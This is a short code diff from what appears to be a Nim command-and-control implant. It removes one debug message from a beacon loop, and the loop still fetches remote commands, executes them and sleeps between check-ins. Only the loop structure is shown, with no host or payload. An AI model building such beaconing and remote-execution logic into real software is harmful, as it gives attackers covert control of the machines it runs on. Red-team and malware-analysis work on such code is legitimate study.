@@ -38,7 +38,6 @@ proc beacon() =
             dbg "[+] should exit, quiiting..."
             quit(1)
         
-        dbg "[+] pull command and execute"
         pull_command_and_exec()
         sleep(sleep_interval)
 
